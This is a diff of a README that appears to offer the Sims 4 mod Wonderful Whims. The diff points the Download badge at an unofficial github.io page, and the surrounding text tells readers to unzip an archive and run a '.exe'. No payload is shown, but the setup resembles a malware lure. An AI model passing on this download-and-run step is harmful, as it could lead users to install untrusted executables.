@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://sims4-wonderful-whims.github.io/.github/)
 
 ## 📸 Overview
 ![sims4-wonderfulwhims-attraction](https://github.com/user-attachments/assets/7a19c6b4-b709-499b-b467-2a53bb18c189)
